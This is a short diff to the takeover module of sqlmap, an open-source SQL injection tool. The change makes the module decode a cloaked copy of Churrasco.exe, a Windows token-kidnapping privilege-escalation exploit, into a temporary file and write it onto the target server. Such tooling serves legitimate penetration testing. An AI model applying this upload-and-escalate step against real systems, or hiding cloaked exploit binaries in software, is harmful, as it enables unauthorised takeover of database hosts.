@@ -24,7 +24,9 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 import os
 import re
+from tempfile import NamedTemporaryFile
 
+from extra.cloak.cloak import decloak
 from lib.core.agent import agent
 from lib.core.common import fileToStr
 from lib.core.common import getDirs
@@ -44,7 +46,6 @@ from lib.takeover.abstraction import Abstraction
 from lib.takeover.metasploit import Metasploit
 from lib.takeover.registry import Registry
 from lib.techniques.outband.stacked import stackedTest
-
 
 class Takeover(Abstraction, Metasploit, Registry):
     """
@@ -66,12 +67,17 @@ class Takeover(Abstraction, Metasploit, Registry):
         output = readInput(msg, default="Y")
 
         if not output or output[0] in ( "y", "Y" ):
-            wFile = os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe")
-
+            tmpFile = NamedTemporaryFile()
+            tmpFile.write(decloak(os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe_")))
+            tmpFile.seek(0)
+            
+            wFile                 = tmpFile.name
             self.churrascoPath    = "%s/sqlmapchur%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
             self.cmdFromChurrasco = True
-
+            
             self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)
+            
+            tmpFile.close()
 
             return True
         else:
